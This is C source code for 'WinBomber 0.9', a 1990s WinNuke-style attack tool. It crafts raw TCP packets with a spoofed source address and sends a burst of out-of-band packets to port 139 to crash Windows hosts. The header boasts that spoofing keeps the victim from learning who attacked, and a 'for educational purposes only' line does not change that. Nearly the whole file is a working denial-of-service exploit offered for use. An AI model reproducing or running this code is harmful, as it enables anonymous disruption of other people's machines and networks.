 /* ************************************************************ */
/* WinBomber 0.9 by HeTak 05.10.97    */
/*        */
/* This simply demonstrates shitty Win networking by   */
/* sending Out of Bound Message flag in Ba ACK packet.   */
/* The difference between winnuke.c is that WinBomber   */
/* spoofs source ip (you) for extra security so the person */
/* who will get nuked will not know who sent the nuke.  */
/* FOR EDUCATIONAL PURPOSES ONLY.     */
/* Sometimes I'm on irc, find me there for any questions.  */
/*        */
/* ************************************************************ */
 

#include <unistd.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>

#define PACKET_SIZE sizeof(struct tcppkt)
#define DEF_BADDR "132.45.6.8"

struct tcppkt {
 struct iphdr ip;
 struct tcphdr tcp;
};
 
 

unsigned short in_chksum(addr, len)
 u_short *addr;
 int len;
{
 register int nleft = len;
 register u_short *w = addr;
 register int sum =0;
 u_short answer =0;
 
 while(nleft > 1)  {
  sum+= *w++;
  nleft -= 2;
  }
 
 if (nleft == 1) {
  *(u_char *) (&answer) = *(u_char *) w;
  sum+=answer;
  }
 
  sum = (sum >> 16) + ( sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}
 
 

/* ********************************************************************** */

int bombaway(sin, fakesock, saddr)
 struct sockaddr_in *sin;
 u_long saddr;
 int fakesock;
{
 register struct iphdr *ip;
 register struct tcphdr *tcp;
 register char *php;
 static char packet[PACKET_SIZE];
 static char phead[PACKET_SIZE+12];
 u_short len =0;
 u_short sport = 5150;
 
 ip = (struct iphdr *) packet;
 
 ip->ihl  = 5;
 ip->version = 4;
 ip->tos  = 0;
 ip->tot_len = htons(PACKET_SIZE);
 ip->id  = htons(918 + (rand()%32768));
 ip->frag_off = 0;
 ip->ttl  = 255;
 ip->protocol = IPPROTO_TCP;
 ip->check = 0;
 ip->saddr = saddr;
 ip->daddr = sin->sin_addr.s_addr;

 tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
 tcp->th_sport = htons(sport++);
 tcp->th_dport = htons(sin->sin_port);
 tcp->th_seq = htonl(31337);
 tcp->th_ack = 0;
 tcp->th_x2 = 0;
 tcp->th_off = 5;
 tcp->th_flags = TH_ACK; /* Maybe could use some other flag */
 tcp->th_win = htons(10052);
 tcp->th_sum = 0;
 tcp->th_urp = 0;
 php = phead;
 memset(php, 0, PACKET_SIZE + 12);
 memcpy(php, &(ip->saddr), 8);
 php += 9;
 memcpy(php, &(ip->protocol), 1);
 len = htons(sizeof(struct tcphdr));
 memcpy(++php, &(len), 2);
 php += 2;
 memcpy(php, tcp, sizeof(struct tcphdr));
 
 tcp->th_sum = in_chksum(php, sizeof(struct tcphdr)+12);
 
 
 return (sendto(fakesock, packet, PACKET_SIZE, MSG_OOB, (struct sockaddr *) sin,
   sizeof(struct sockaddr_in)));
}

/* *********************************************************************** */
 
 
 

u_long
resolve(host)
char *host;
{
 struct hostent *he;
 u_long addr;
 if ((he = gethostbyname(host)) == NULL) {
  addr = inet_addr(host);
  }
 else {
  bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));
  }
 return (addr);
}
 

main(argc, argv)

int argc;
char **argv;
{

 int mainsock, fakesock, bombs;
 u_short dport;
 u_long saddr, daddr;
 struct sockaddr_in sin;
 struct hostent *host;
 bombs = saddr = 0;
 

/* **************************************************************************************** */
 

if (argc<3)
 {
 printf("Usage: %s <source> <destination> \n", argv[0]);
 exit();
 }
 
 

 if ((daddr = resolve(argv[2])) == -1) {  /* Resolve destination */
  printf("Unable to resolve destination hostname -> %s\n", argv[2]);
  exit(1);
  }

 if ((saddr = resolve(argv[1])) == -1) {
  printf("Bad spoofed source -> %s\nOhh well...using default.\n\n", argv[1]);
  saddr=inet_addr(DEF_BADDR);
  }
 

 dport = 139;

/* **************************************************************************************** */
 

 bzero(&sin, sizeof(struct sockaddr_in));
 sin.sin_family=AF_INET;
 sin.sin_addr.s_addr=daddr;
 sin.sin_port=htons(139);
 

/*      ***************************************************************** */

 if ((mainsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
  perror("Unable to open main socket.");
  exit(1);
 }

 if ((fakesock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
  perror("Unable to open raw socket.");
  exit(1);
 }
 
 
 if (connect(mainsock, (struct sockaddr *)&sin, 16)== -1) {
    perror("Unable to open connection:");
    close(mainsock);
    }
 
/*      ***************************************************************** */

 printf("WiNBomber 0.9 by HeTak.\n");
 printf("Connection established.\n");
 printf("Sending <%d> bombs to port <%d> to <%s>...\n",
   bombs, ntohs(sin.sin_port), argv[2] );
 printf("Ready to bomb. Sleeping for a while.\n");
 sleep(3);
 while(bombs!=10) {
  printf("<%s> >=----=|B+O+M+B|=-----> <%s:139>\t# <%d>\n",
   argv[1], argv[2], bombs);
  bombaway(&sin, fakesock, saddr);
  usleep(100000);
  bombs++;
 }
 printf("Bombs dropped.\n");
 exit(0);
}
  
